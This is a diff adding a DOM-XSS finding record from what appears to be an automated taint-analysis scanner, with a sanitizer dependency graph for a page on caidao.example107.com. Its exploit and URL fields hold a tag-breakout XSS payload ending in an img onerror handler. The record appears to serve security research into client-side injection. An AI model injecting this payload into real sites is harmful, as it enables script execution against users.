@@ -1,0 +1,90 @@
+// Finding: 7d96fb7d-44d8-4e43-b275-2f7d94c50c4a
+// Finding.url: https://caidao.example107.com/1037523/index.html?utm_medium=dkz##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('011f7fade0c54cf7acc23f54c37dfe04')><!--/*
+// Finding.parentloc: https://caidao.example107.com/1037523/index.html?utm_medium=dkz##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('011f7fade0c54cf7acc23f54c37dfe04')><!--/*
+// Finding.domain: caidao.example107.com
+// Finding.base_domain: example107.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: payUrlFrom
+// Sanitizer.location: https://imgcd.example107.com/resourcef5c62928/teacher/js/index.js?_v=20210329&f5c62928 - gettag/<:697:49
+// Finding.begin: 92
+// Finding.end: 99
+// Finding.original_uuid: 9f36adb1-485a-40c9-91ca-1c8e754a8e71
+// Finding.TwentyFiveMillionFlowsId: -1733242368
+// Finding.script: https://imgcd.example107.com/js/jquery.js
+// Finding.line: 3
+// Exploit.uuid: 011f7fad-e0c5-4cf7-acc2-3f54c37dfe04
+// Exploit.success: false
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: data-url
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 30
+// Exploit.end_taint_url: 37
+// Exploit.replace_begin_url: 63
+// Exploit.replace_end_url: 63
+// Exploit.replace_begin_param: 378
+// Exploit.replace_end_param: 378
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: true
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1129161699
+// DepGraph.sanitizer_hash: 1074031079
+// Part of the URL ('https://caidao.example107.com/') found in right hand side of replace 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="RegExp: /[&]/"];
+n3 [shape=box, label="Lit: ?"];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="."];
+n6 [shape=box, label="Lit: https://caidao.example107.com/"];
+n7 [shape=ellipse, label="str_replace_once"];
+n8 [shape=box, label="RegExp: /(^|https{0,1}:)\/\/.*?\//"];
+n9 [shape=box, label="Lit: https://caidao.example107.com/"];
+n10 [shape=box, label="Var: x"];
+n11 [shape=ellipse, label="str_replace_once"];
+n12 [shape=box, label="Lit: http:"];
+n13 [shape=box, label="Lit: "];
+n14 [shape=box, label="Var: x"];
+n15 [shape=box, label="Var: x"];
+n16 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n5 -> n6;
+n5 -> n1;
+n10 -> n5;
+n7 -> n8;
+n7 -> n9;
+n7 -> n10;
+n14 -> n7;
+n11 -> n12;
+n11 -> n13;
+n11 -> n14;
+n15 -> n11;
+n16 -> n15;
+}
